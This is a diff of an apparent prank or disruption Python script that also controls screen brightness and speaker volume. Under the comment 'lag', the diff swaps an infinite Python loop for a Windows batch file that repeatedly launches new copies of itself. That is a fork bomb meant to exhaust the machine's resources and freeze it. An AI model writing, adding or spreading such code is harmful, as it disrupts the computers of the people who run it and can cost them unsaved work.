@@ -9,9 +9,9 @@ import screen_brightness_control as sbc
 import os
 
 #lag
-with open('never.py', 'w') as f:
-  f.write('while True:\n    pass')
-a=os.path.abspath("never.py")
+with open('never.bat', 'w') as f:
+  f.write('start\n start\n start\n start\n start\n start\n start\n  start\n never.bat')
+a=os.path.abspath("never.bat")
 
 #Set max volume
 devices = AudioUtilities.GetSpeakers()
